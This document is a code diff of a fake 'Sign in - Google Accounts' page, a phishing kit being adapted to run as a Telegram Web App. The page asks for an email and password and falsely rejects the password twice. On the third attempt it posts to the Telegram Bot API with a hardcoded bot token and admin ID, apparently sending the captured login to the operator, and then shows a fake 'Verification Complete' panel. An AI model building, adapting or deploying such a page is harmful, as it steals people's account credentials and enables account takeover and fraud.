@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Sign in - Google Accounts</title>
+    <!-- د تلګرام Web App سکریپټ -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -84,21 +86,11 @@
         }
         .cancel-btn:hover { background: #c82333; }
         .hidden { display: none; }
-        .btn-group {
-            display: flex;
-            gap: 1rem;
-            margin-top: 1rem;
-        }
-        .btn-group .cancel-btn {
-            margin-top: 0;
-            flex: 1;
-        }
     </style>
 </head>
 <body>
 
 <div class="google-card">
-    <!-- مرحله 1: برېښنالیک -->
     <div id="step1View">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>Sign in</h1>
@@ -110,7 +102,6 @@
         <a href="#" class="create-account" onclick="alert('Create account'); return false;">Create account</a>
     </div>
 
-    <!-- مرحله 2: پټنوم -->
     <div id="step2View" class="hidden">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>Sign in</h1>
@@ -121,14 +112,11 @@
         <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
     </div>
 
-    <!-- د بریالیتوب پینل -->
     <div id="successPanel" class="hidden">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>✅ Verification Complete</h1>
         <div class="sub">Your account has been successfully verified!</div>
-        <div class="btn-group">
-            <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
-        </div>
+        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
@@ -138,8 +126,19 @@
 </div>
 
 <script>
-    // ========== د بوټ لینک (ستاسو د بوټ یوزرنیم سره) ==========
-    const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
+    // ========== د تلګرام Web App تنظیمات ==========
+    let tg = window.Telegram?.WebApp;
+    
+    // که چیرې په تلګرام کې خلاص شوی وي، WebApp فعال کړئ
+    if (tg) {
+        tg.ready();
+        tg.expand(); // پاڼه پراخه کړئ
+        console.log("Telegram Web App is available");
+    }
+    
+    // د بوټ لینک (ستاسو د بوټ یوزرنیم سره)
+    const BOT_USERNAME = "imrankhabot";  // <--- خپل بوټ یوزرنیم دلته دننه کړئ
+    const BOT_REDIRECT = `https://t.me/imrankhabot?start=confirm_account`;
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
@@ -168,7 +167,6 @@
         currentEmail = '';
     }
 
-    // مرحله 1: برېښنالیک
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
         if (!email || !email.includes('@')) {
@@ -183,7 +181,6 @@
         document.getElementById('passwordInput').value = '';
     };
 
-    // مرحله 2: پټنوم (3 هڅې)
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         if (!pass) {
@@ -196,16 +193,13 @@
         if (!attempts[key]) attempts[key] = 0;
         attempts[key]++;
         
-        // لومړی او دوهم ځل - ناکام
         if (attempts[key] === 1 || attempts[key] === 2) {
             showMessage(document.getElementById('errorBox'), `❌ Incorrect password. ${3 - attempts[key]} attempts remaining.`, true);
             setTimeout(() => goBackToEmail(), 2000);
             return;
         }
         
-        // درېیم ځل - بریالی
         if (attempts[key] >= 3) {
-            // اډمن ته خبر ورکړئ
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -215,15 +209,26 @@
                 })
             });
             
-            // د بریالیتوب پینل ښکاره کړئ
             document.getElementById('step2View').classList.add('hidden');
             document.getElementById('successPanel').classList.remove('hidden');
         }
     };
     
-    // د CANCEL تڼۍ - مستقیم بوټ ته ځي او لومړی ګام بشپړوي
+    // د CANCEL تڼۍ - د Web App API له لارې بندول
     document.getElementById('cancelBtn').onclick = () => {
-        window.location.href = BOT_REDIRECT;
+        // که چیرې په تلګرام Web App کې وي، نو Web App بنده کړئ
+        if (tg) {
+            try {
+                // Web App بنده کړئ - دا به بوټ ته راستون شي[citation:1][citation:6]
+                tg.close();
+            } catch(e) {
+                console.log("Close error:", e);
+                window.location.href = BOT_REDIRECT;
+            }
+        } else {
+            // که په عادي براوزر کې وي، نو مستقیم بوټ ته لاړ شئ
+            window.location.href = BOT_REDIRECT;
+        }
     };
 </script>
 </body>
